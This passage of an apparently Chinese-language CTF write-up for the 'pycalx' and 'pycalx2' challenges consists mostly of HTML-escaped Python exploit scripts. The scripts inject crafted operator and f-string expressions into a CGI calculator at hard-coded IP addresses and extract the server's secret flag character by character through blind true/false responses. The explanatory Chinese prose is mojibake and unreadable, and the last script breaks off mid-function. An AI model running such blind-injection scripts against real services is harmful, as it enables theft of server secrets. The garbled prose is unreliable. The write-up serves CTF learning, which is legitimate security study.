&lt;span style="color:#111">op&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;+&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">value2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39; and FLAG&amp;gt;source#&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">prev&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">45&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">printable&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">source&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prev&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">source&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;False&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#39;security&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prev&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">prev&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹Ÿå¯ä»¥äºŒåˆ†ï¼ˆæ„Ÿè§‰è‡ªå·±ä¹‹å‰å†™çš„äºŒåˆ†æ³•çš„è„šæœ¬åº”è¯¥è§£è€¦äº†ï¼Œä¸ç„¶é‡åˆ°è¿™ç§æƒ…å†µçš„è¯éœ€è¦æ”¹çš„åœ°æ–¹å°±å¤ªå¤šäº†ï¼Œåº”è¯¥æ”¹æˆä¸€äº›å‡½æ•°çš„é›†åˆä½“ å°±åƒè¿™ä¸ªå¤§ä½¬çš„ä¸€æ ·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">re&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">calc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">u&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://178.128.96.203/cgi-bin/server.py?&amp;#34;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># print payload&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># print r.url&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">re&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">findall&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;gt;&amp;gt;&amp;gt;&amp;gt;([\s\S]*)&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;gt;&amp;gt;&amp;gt; &amp;lt;\/pre&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Invalid&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;True&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># print r.content&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">calc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">bin_search&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">xrange&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0x20&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0x80&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">lo&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">hi&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">hi&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">hi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">hi&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">mid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hi&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;span style="color:#75715e"># print lo, mid, hi, &amp;#34;\t&amp;#34;,&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">check&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">]):&lt;/span> &lt;span style="color:#111">hi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">lo&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;x&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;+FLAG&amp;lt;value1+source#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;+&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">bin_search&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">flag&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€”â€”â€”â€”â€”â€”â€”â€”ä¸‹é¢æ˜¯pycalx2&lt;/p>
&lt;p>æŠŠä¸Šé¢çš„opé‚£é‡Œä¹ŸåŠ äº†&lt;code>get_value&lt;/code>å‡½æ•°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211173952684.png" alt="image-20211211173952684">&lt;/p>
&lt;p>ä¸èƒ½ç”¨å•å¼•å·äº†ï¼Œè¿™é‡Œè€ƒçš„åœ°æ–¹æ˜¯&lt;code>f-string&lt;/code>çš„ç‰¹æ€§ï¼Œå¯ä»¥ç›´æŽ¥æ’å…¥è¿ç®—è¡¨è¾¾å¼ï¼Œä¸è¿‡è¦æ”¹ä¸€ä¸‹è„šæœ¬çš„æ€è·¯&lt;/p>
&lt;pre tabindex="0">&lt;code>f&amp;quot;{Flag&amp;gt;source or 'e'}&amp;quot;
&lt;/code>&lt;/pre>&lt;p>å¦‚æžœæˆåŠŸè¾“å‡º1ï¼Œä¸æˆåŠŸè¾“å‡ºeï¼Œæ‹¼æŽ¥ä¸Šå‰é¢çš„Truï¼ŒæˆåŠŸä¸ºTru1ï¼Œä¸æˆåŠŸä¸ºTrue&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://192.168.60.131/cgi-bin/py.py?source=&lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;amp;value1=&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">&amp;amp;op=&lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">&amp;amp;value2=&lt;/span>&lt;span style="color:#d88200">{3}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;T&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">op&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;+f&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ru{FLAG&amp;gt;source or 14:x}&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">prev&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">printable&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prev&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#75715e">#print(result)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;True&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#34;security&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prev&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">prev&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">i&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">re&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">calc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">u&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://206.189.223.3/cgi-bin/server.py?&amp;#34;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">re&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">findall&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;gt;&amp;gt;&amp;gt;&amp;gt;([\s\S]*)&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;gt;&amp;gt;&amp;gt; &amp;lt;\/pre&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;Invalid&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">calc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">bin_search&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">xrange&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0x20&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0x80&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">lo&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">hi&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">hi&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">hi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">hi&lt;/span>&lt;span style="color:#111">:&lt;/span>
